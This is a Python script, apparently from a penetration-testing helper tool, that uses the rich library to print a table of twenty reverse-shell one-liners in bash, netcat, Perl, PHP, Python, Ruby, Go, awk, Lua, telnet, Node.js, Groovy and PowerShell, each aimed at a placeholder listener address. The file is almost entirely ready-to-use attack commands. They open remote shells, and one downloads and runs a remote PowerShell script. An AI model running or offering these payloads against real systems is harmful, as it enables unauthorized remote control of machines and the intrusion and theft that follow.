from rich.console import Console
from rich.table import Table
from rich import box

def the_list():
    console = Console()
    table = Table(show_header=True, header_style="bold cyan2", box=box.DOUBLE)
    table.add_column("ID")
    table.add_column("Name")
    table.add_column("Preview")
    table.add_row(
        "[bold]1",
        "[bold]bash tcp",
        "[orchid][orchid]/bin/bash[/][/] -i >& /dev/tcp/[light_green]10.10.10.10[/]/[light_green]1000[/] 0>&1"
    )
    table.add_row(
        "[bold]2",
        "[bold]bash udp",
        "[orchid][orchid]/bin/bash[/][/] -i >& /dev/udp/[light_green]10.10.10.10[/]/[light_green]1000[/] 0>&1"
    )
    table.add_row(
        "[bold]3",
        "[bold]nc -c",
        "nc -c [orchid][orchid]/bin/bash[/][/] [light_green]10.10.10.10 1000[/]"
    )
    table.add_row(
        "[bold]4",
        "[bold]nc -e",
        "nc -e [orchid][orchid]/bin/bash[/][/] [light_green]10.10.10.10 1000[/]"
    )
    table.add_row(
        "[bold]5",
        "[bold]nc mkfifo",
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|[orchid][orchid]/bin/bash[/][/] -i 2>&1|nc [light_green]10.10.10.10 1000[/] >/tmp/f"
    )
    table.add_row(
        "[bold]6",
        "[bold]rustcat",
        "rcat [light_green]10.10.10.10 1000[/] -r [orchid][orchid]/bin/bash[/][/]"
    )
    table.add_row(
        "[bold]7",
        "[bold]perl",
        "perl -e 'use Socket;$i=\"[light_green]10.10.10.10[/]\";$p=[light_green]1000[/];socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"[orchid][orchid]/bin/bash[/][/] -i\");};'"
    )
    table.add_row(
        "[bold]8",
        "[bold]PHP exec",
        "php -r '$sock=fsockopen(\"[light_green]10.10.10.10[/]\",[light_green]1000[/]);exec(\"[orchid][orchid]/bin/bash[/][/] <&3 >&3 2>&3\");'"
    )
    table.add_row(
        "[bold]9",
        "[bold]PHP shell_exec",
        "php -r '$sock=fsockopen(\"[light_green]10.10.10.10[/]\",[light_green]1000[/]);shell_exec(\"[orchid][orchid]/bin/bash[/][/] <&3 >&3 2>&3\");'"
    )
    table.add_row(
        "[bold]10",
        "[bold]PHP passthru",
        "php -r '$sock=fsockopen(\"[light_green]10.10.10.10[/]\",[light_green]1000[/]);passthru(\"[orchid][orchid]/bin/bash[/][/] <&3 >&3 2>&3\");'"
    )
    table.add_row(
        "[bold]11",
        "[bold]python2 -c",
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[light_green]10.10.10.10[/]\",[light_green]1000[/]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"[orchid][orchid]/bin/bash[/][/]\")'"
    )
    table.add_row(
        "[bold]12",
        "[bold]python3 -c",
        "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[light_green]10.10.10.10[/]\",[light_green]1000[/]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"[orchid][orchid]/bin/bash[/][/]\")'"
    )
    table.add_row(
        "[bold]13",
        "[bold]ruby no-sh",
        "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"[light_green]10.10.10.10[/]\",\"[light_green]1000[/]\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'"
    )
    table.add_row(
        "[bold]14",
        "[bold]golang",
        "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"[light_green]10.10.10.10[/]:[light_green]1000[/]\");cmd:=exec.Command(\"[orchid]/bin/bash[/]\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
    )
    table.add_row(
        "[bold]15",
        "[bold]awk",
        "awk 'BEGIN {s = \"/inet/tcp/0/[light_green]10.10.10.10[/]/[light_green]1000[/]\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
    )
    table.add_row(
        "[bold]16",
        "[bold]lua -e",
        "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('[light_green]10.10.10.10[/]','[light_green]1000[/]');os.execute('[orchid]/bin/bash[/] -i <&3 >&3 2>&3');\""
    )
    table.add_row(
        "[bold]17",
        "[bold]telnet",
        "TF=$(mktemp -u);mkfifo $TF && telnet [light_green]10.10.10.10 1000[/] 0<$TF | [orchid]/bin/bash[/] 1>$TF"
    )
    table.add_row(
        "[bold]18",
        "[bold]nodejs",
        "require('child_process').exec('nc -e [orchid]/bin/bash[/] [light_green]10.10.10.10 1000[/]')"
    )   
    table.add_row(
        "[bold]19",
        "[bold]windows conpty",
        "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell [light_green]10.10.10.10 1000[/]"
    )
    table.add_row(
        "[bold]20",
        "[bold]groovy",
        "String host=\"[light_green]10.10.10.10[/]\";int port=[light_green]1000[/];String cmd=\"[orchid]/bin/bash[/]\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
    )
    

    console.print(table)